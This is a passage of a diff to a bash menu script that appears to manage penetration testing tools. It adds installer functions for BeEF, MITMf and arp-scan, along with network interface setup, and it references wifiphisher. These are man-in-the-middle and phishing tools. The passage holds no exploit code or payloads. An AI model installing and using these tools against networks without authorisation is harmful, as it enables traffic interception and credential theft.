 	elif [[ "$YORNAA" = "changelog" ]]
@@ -6495,7 +7447,7 @@ function main_options
 				install_wifiphisher
 			fi
 		fi
-	elif [[ "$YORNAA" = "wififb" ]]
+	elif [[ "$YORNAA" = "$wififb" ]]
 	then
 		if [[ -d /root/wifiphisher ]]
 		then
@@ -7710,8 +8662,40 @@ check_if_ks
 		python installer.py
 		chmod +x /usr/bin/sechub
 	}
+	function install_beef
+	{
+		apt-get install beef-xss
+	}
+	function install_mitmf
+	{
+		apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
+		foldname="MITMf"
+		gitlink="https://github.com/byt3bl33d3r/MITMf"
+		if [[ "$foldname" = "" ]]
+		then
+			exit
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/"$foldname"
+		fi
+		cd
+		git clone $gitlink
+		cd $foldname
+		git submodule init
+		git submodule update --recursive
+		pip install -r requirements.txt
+		pip2.7 install -r requirements.txt
+	}
+	function install_arp_scan
+	{
+		apt-get -y install arp-scan
+	}
 	
-	
+		
 #------------------------------------
 ####################################
 defaults_l
@@ -7728,11 +8712,21 @@ then
 	then
 		set_interface_number
 	fi
+	if [[ ! -f ""$LPATH"/wlanmon.txt" ]]
+	then
+		set_interface_number
+	fi
+	if [[ ! -f ""$LPATH"/eth.txt" ]]
+	then
+		set_interface_number
+	fi
 	clear
 	WLANNM=$(cat "$LPATH"/wlanmon.txt)
 	WLANN=$(cat "$LPATH"/wlan.txt)
+	ETH=$(cat "$LPATH"/eth.txt)	
 	export WLANNM
 	export WLANN
+	export ETH
 	managed_spaces
 	monitor_spaces
 	if [[ ! -f "$LPATH"/latestchangelog.txt ]]
